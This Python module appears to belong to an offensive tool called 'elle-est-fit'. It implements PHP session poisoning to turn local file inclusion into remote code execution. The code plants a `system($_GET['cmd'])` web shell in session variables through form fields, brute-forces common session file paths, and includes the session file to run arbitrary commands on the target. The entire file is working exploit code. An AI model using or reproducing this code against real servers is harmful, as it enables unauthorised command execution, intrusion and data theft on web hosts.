"""
PHP Session technique implementation for LFI to RCE exploitation.

This technique works by:
1. Setting a PHP payload in a session variable
2. Finding the session file path on the server 
3. Including the session file via LFI to execute the payload
"""

import logging
import re
import random
import string
import time
import urllib.parse
from typing import Optional, Dict, List

import requests

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase

logger = logging.getLogger("elle-est-fit")


class PHPSessionTechnique(TechniqueBase):
    """
    Exploit LFI using PHP sessions.
    
    This technique leverages PHP session files to achieve RCE.
    """
    
    name = "php_session"
    description = "LFI to RCE via PHP session files"
    
    def __init__(self, **kwargs):
        """Initialize the PHP session technique."""
        super().__init__(**kwargs)
        self.session_token = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
        self.detection_string = f"ELLEESTFIT_{self.session_token}"
        self.verbose = kwargs.get('verbose', False)
        self.session_paths = [
            "/tmp/sess_{}",
            "/var/lib/php/sessions/sess_{}",
            "/var/lib/php5/sess_{}",
            "/var/lib/php7/sess_{}",
            "/var/lib/php-sessions/sess_{}",
            "/private/tmp/sess_{}"
        ]
        self.session_cookie = ""
        self.session_path = ""
        self.session_payload = f"<?php system($_GET['cmd']); ?>"
    
    def check(self) -> bool:
        """
        Check if the target is vulnerable to the PHP session technique.
        
        Returns:
            True if the technique is viable, False otherwise
        """
        logger.info("Checking if target is vulnerable to PHP session technique")
        
        try:
            session_id = self._create_session_with_payload(f"<{self.detection_string}>")
            
            if not session_id:
                logger.info("Failed to create a PHP session")
                return False
                
            # Try different session file paths
            for path_template in self.session_paths:
                path = path_template.format(session_id)
                
                if self.verbose:
                    logger.debug(f"Trying session path: {path}")
                
                # Try to include the session file
                result = self.leak_function(path)
                
                # Check if our detection string is in the response
                if self.detection_string in result:
                    logger.info(f"Target is vulnerable to PHP session technique! Session file found at {path}")
                    self.session_path = path
                    self.session_cookie = session_id
                    return True
            
            logger.info("Session file not found in common locations")
            
        except Exception as e:
            logger.debug(f"Error during check: {str(e)}")
        
        logger.info("Target does not appear vulnerable to PHP session technique")
        return False
    
    def exploit(self) -> bool:
        """
        Exploit the LFI using PHP sessions to achieve RCE.
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("Exploiting using PHP session technique")
        
        try:
            # If we already found the session path during check, use it
            if self.session_path and self.session_cookie:
                # Update the session with the RCE payload
                success = self._update_session_with_payload(self.session_cookie, self.session_payload)
                
                if not success:
                    logger.error("Failed to update session with RCE payload")
                    return False
                
                # Verify RCE by executing a test command
                test_result = self._execute_via_session("echo " + self.detection_string)
                
                if self.detection_string in test_result:
                    logger.info("RCE achieved via PHP session file")
                    self.shell_path = self.session_path
                    return True
            
            # If we don't have session info, try to create a new one
            session_id = self._create_session_with_payload(self.session_payload)
            
            if not session_id:
                logger.error("Failed to create a PHP session")
                return False
            
            # Try different session file paths
            for path_template in self.session_paths:
                path = path_template.format(session_id)
                
                # Try to include the session file and execute a test command
                self.session_path = path
                self.session_cookie = session_id
                
                test_result = self._execute_via_session("echo " + self.detection_string)
                
                if self.detection_string in test_result:
                    logger.info(f"RCE achieved via PHP session file at {path}")
                    self.shell_path = path
                    return True
            
            logger.error("Failed to achieve RCE via PHP session files")
            return False
            
        except Exception as e:
            logger.error(f"Error during exploitation: {str(e)}")
            return False
    
    def execute(self, command: str) -> str:
        """
        Execute a command via the established RCE.
        
        Args:
            command: Command to execute
            
        Returns:
            Command output
        """
        if not self.shell_path or not self.session_cookie:
            raise ExecutionError("No PHP session shell established. Run exploit() first.")
        
        return self._execute_via_session(command)
    
    def _create_session_with_payload(self, payload: str) -> Optional[str]:
        """
        Create a new PHP session with a payload.
        
        Args:
            payload: PHP payload to store in the session
            
        Returns:
            Session ID if successful, None otherwise
        """
        if not self.target:
            logger.error("Target URL is required for PHP session technique")
            return None
        
        try:
            # Create a session by sending a request
            base_url = re.sub(r'\{.*?\}', '', self.target)
            
            # Send a request to initialize a session
            response = self.session.get(base_url, timeout=self.timeout)
            
            # Check if we got a PHPSESSID cookie
            cookies = response.cookies
            session_id = cookies.get('PHPSESSID')
            
            if not session_id:
                logger.debug("No PHPSESSID cookie found in the response")
                
                # Try to generate our own session ID
                session_id = ''.join(random.choice(string.hexdigits.lower()) for _ in range(32))
                # Set the cookie for future requests
                self.session.cookies.set('PHPSESSID', session_id)
            
            if self.verbose:
                logger.debug(f"Using session ID: {session_id}")
            
            # Set the payload in a session variable (depends on application)
            # This part is tricky as it depends on how the application stores session data
            # We'll try a few common ways to store data in the session
            
            # Method 1: Try using a username/user parameter
            data_payloads = [
                {'username': payload, 'user': payload},
                {'user': payload, 'name': payload},
                {'username': payload, 'password': 'password123'},
                {'user': payload, 'pass': 'password123'}
            ]
            
            # Try each payload
            for data in data_payloads:
                self.session.post(base_url, data=data, timeout=self.timeout)
            
            return session_id
            
        except Exception as e:
            logger.debug(f"Error creating session: {str(e)}")
            return None
    
    def _update_session_with_payload(self, session_id: str, payload: str) -> bool:
        """
        Update an existing PHP session with a payload.
        
        Args:
            session_id: PHP session ID
            payload: PHP payload to store in the session
            
        Returns:
            True if successful, False otherwise
        """
        if not self.target:
            logger.error("Target URL is required for PHP session technique")
            return False
        
        try:
            # Set the session cookie
            self.session.cookies.set('PHPSESSID', session_id)
            
            # Get the base URL
            base_url = re.sub(r'\{.*?\}', '', self.target)
            
            # Method 1: Try using a username/user parameter
            data_payloads = [
                {'username': payload, 'user': payload},
                {'user': payload, 'name': payload},
                {'username': payload, 'password': 'password123'},
                {'user': payload, 'pass': 'password123'}
            ]
            
            # Try each payload
            for data in data_payloads:
                self.session.post(base_url, data=data, timeout=self.timeout)
            
            return True
            
        except Exception as e:
            logger.debug(f"Error updating session: {str(e)}")
            return False
    
    def _execute_via_session(self, command: str) -> str:
        """
        Execute a command via the PHP session.
        
        Args:
            command: Command to execute
            
        Returns:
            Command output
        """
        # Encode the command
        encoded_command = urllib.parse.quote(command)
        
        # Set the session cookie for the request
        cookies = {'PHPSESSID': self.session_cookie}
        
        try:
            # Include the session file and pass the command parameter
            lfi_url = self.target.format(self.session_path) + f"&cmd={encoded_command}"
            
            if self.verbose:
                logger.debug(f"Executing via session: {lfi_url}")
            
            # Make the request with the session cookie
            response = self.session.get(
                lfi_url,
                cookies=cookies,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                # Try to extract the command output
                return response.text
            else:
                logger.debug(f"Request failed with status code: {response.status_code}")
                return ""
                
        except Exception as e:
            logger.debug(f"Error executing command: {str(e)}")
            return ""